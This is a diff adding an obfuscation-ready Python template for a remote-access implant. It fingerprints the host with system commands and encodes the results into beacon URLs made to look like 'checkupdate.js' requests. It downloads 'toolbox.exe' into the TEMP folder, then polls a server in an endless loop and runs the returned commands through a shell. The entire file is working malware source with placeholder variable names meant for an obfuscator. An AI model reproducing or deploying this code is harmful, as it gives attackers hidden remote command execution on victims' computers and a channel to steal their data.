@@ -1,0 +1,169 @@
+import urllib2, base64
+import subprocess
+import time, os, random
+
+
+
+"{null_bloc_0}"
+
+{crypt_var_1} = "http://{API_FQDN}"
+{crypt_var_2} = "{}/checkupdate.js?id={}&token={}&platform={}"
+
+"{null_bloc_0}"
+
+{crypt_var_25} = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'
+{crypt_var_26} = 'User-Agent'
+
+"{null_bloc_0}"
+
+{crypt_var_27} = 'JustKidding'
+
+
+"{null_bloc_0}"
+
+
+{crypt_var_29} = 'TEMP'
+{crypt_var_30} = 30
+
+"{null_bloc_0}"
+
+
+{crypt_var_28} = os.environ[{crypt_var_29}]
+
+"{null_bloc_0}"
+
+{crypt_var_31} = 'toolbox.exe'
+{crypt_var_32} = '{}\\{}'.format({crypt_var_28}, {crypt_var_31})
+
+"{null_bloc_0}"
+
+{crypt_var_4} = {{crypt_var_26}: {crypt_var_25}}
+{crypt_var_3} = {{crypt_var_26}: {crypt_var_27}}
+
+"{null_bloc_0}"
+
+
+{crypt_var_33} = {hash_table_windows_}
+
+"{null_bloc_0}"
+
+
+def {crypt_func_1}({crypt_var_17}, {crypt_var_18}={crypt_var_33}[6]):
+	"{null_bloc_1}"
+	{crypt_var_19} = [[{crypt_var_33}[0], {crypt_var_33}[1]], [{crypt_var_33}[2], {crypt_var_33}[3]], [{crypt_var_33}[4], {crypt_var_33}[5]]]
+	if {crypt_var_18} == -1:
+		{crypt_var_17} = base64.b64encode({crypt_var_17})
+		for i in {crypt_var_19}:
+			{crypt_var_17} = {crypt_var_17}.replace(i[0], i[1])
+		return {crypt_var_17}
+	"{null_bloc_1}"
+	for i in {crypt_var_19}:
+		{crypt_var_17} = {crypt_var_17}.replace(i[::-1][0], i[::-1][1])
+	return base64.b64decode({crypt_var_17})
+
+
+
+
+def {crypt_func_3}({crypt_var_16}):
+	"{null_bloc_1}"
+	{crypt_var_20} = subprocess.check_output({crypt_var_16}, shell=True)
+	"{null_bloc_1}"
+	return {crypt_var_20}
+
+
+
+
+def {crypt_func_2}({crypt_var_16}):
+	"{null_bloc_1}"
+	{crypt_var_21} = {{crypt_var_33}[7]: {crypt_var_33}[8], {crypt_var_33}[9]: "", {crypt_var_33}[10]: {crypt_var_33}[11],{crypt_var_33}[12]: {crypt_var_33}[13], {crypt_var_33}[14]: {crypt_var_33}[15], {crypt_var_33}[16]: {crypt_var_33}[17], {crypt_var_33}[18]: {crypt_var_33}[19]}
+	for k, v in {crypt_var_21}.items():
+		"{null_bloc_2}"
+		{crypt_var_16} = {crypt_var_16}.replace(k, v)
+	if {crypt_var_33}[20] in {crypt_var_16}:
+		"{null_bloc_2}"
+		{crypt_var_22} = {crypt_var_16}[{crypt_var_16}.index({crypt_var_33}[20]):]
+		{crypt_var_22} = {crypt_var_22}[:{crypt_var_22}.index('|')-1]
+		{crypt_var_23} = "{}\\{}.txt".format({crypt_var_28}, random.randint({crypt_var_33}[21], {crypt_var_33}[22]))
+		"{null_bloc_2}"
+		with open({crypt_var_23}, "w") as f:
+			f.write({crypt_var_22}[8:].replace("\\r\\n", "\n")[1:-1])
+		{crypt_var_16} = {crypt_var_16}.replace({crypt_var_22}, {crypt_var_33}[19] + {crypt_var_23})
+	elif {crypt_var_33}[26] in {crypt_var_16}:
+		"{null_bloc_2}"
+		{crypt_var_16} = {crypt_var_33}[23] + [i for i in {crypt_func_3}({crypt_var_33}[25]).split('\r\n') if {crypt_var_33}[24] in i][0].split(' : ')[-1] + ' ' + {crypt_var_16}[::-1][:{crypt_var_16}[::-1].index('|')+1][::-1]
+	return {crypt_var_16}
+
+
+
+"{null_bloc_0}"
+
+{crypt_var_11} = [i.replace(' ', '') for i in {crypt_func_3}({crypt_var_33}[27]).split('\r') if len(i.replace(' ', ''))>10][0].replace('\r', '').replace('\n', '').replace('-','')
+
+{crypt_var_12} = ' '.join([i.replace(' ', '').replace('\n', '').split('=')[1] for i in {crypt_func_3}({crypt_var_33}[28]).split('\r') if len(i.replace(' ', ''))>5])
+
+"{null_bloc_0}"
+
+{crypt_var_10} = {crypt_var_2}.format({crypt_var_1}, {crypt_var_11}, 0, {crypt_func_1}({crypt_var_12}, -1))
+{crypt_var_14} = urllib2.Request({crypt_var_10}, headers={crypt_var_4})
+_ = urllib2.urlopen({crypt_var_14})
+
+
+
+
+def {crypt_func_4}():
+	global {crypt_var_1}, {crypt_var_11}, {crypt_var_12}
+	"{null_bloc_1}"
+	{crypt_var_10} = {crypt_var_2}.format({crypt_var_1}, {crypt_var_11}, {crypt_var_33}[29], {crypt_func_1}({crypt_var_12}, -1))
+	{crypt_var_14} = urllib2.Request({crypt_var_10}, headers={crypt_var_3})
+	{crypt_var_24} = urllib2.urlopen({crypt_var_14})
+	{crypt_var_15} = {crypt_var_24}.read()
+	if {crypt_var_33}[30] in {crypt_var_15}:
+		{crypt_var_15} = {crypt_func_2}({crypt_var_15}[7:])
+		"{null_bloc_2}"
+	return {crypt_var_15}
+
+
+
+"{null_bloc_0}"
+
+{crypt_var_5} = [{crypt_var_33}[32] for i in range(52)]
+{crypt_var_6} = 0
+
+"{null_bloc_0}"
+
+{crypt_var_7} = -1
+
+
+
+{crypt_var_8} = urllib2.urlopen('{}/assets/{}'.format({crypt_var_1}, {crypt_var_31}))
+
+"{null_bloc_0}"
+
+{crypt_var_9} = {crypt_var_8}.read()
+with open({crypt_var_32}, 'wb') as f:
+	f.write({crypt_var_9})
+
+
+
+
+while 1:
+	"{null_bloc_1}"
+	{crypt_var_7} += 1
+	{crypt_var_13} = {crypt_func_4}()
+	{crypt_var_5}[{crypt_var_7}%50 + 2] = {crypt_var_13}
+	if (not ({crypt_var_33}[32] in {crypt_var_5}[{crypt_var_7}%50 + 2] and {crypt_var_33}[32] not in {crypt_var_5}[{crypt_var_7}%50 + 1]) or {crypt_var_6} > {crypt_var_30}):
+		"{null_bloc_2}"
+		print({crypt_var_33}[31].format({crypt_var_13}))
+		{crypt_func_3}({crypt_var_13})
+		{crypt_var_6} = 0
+	else:
+		{crypt_var_7} -= 1
+		{crypt_var_6} += 1
+		"{null_bloc_2}"
+		time.sleep(1)
+
+
+
+"{null_bloc_0}"
+
+
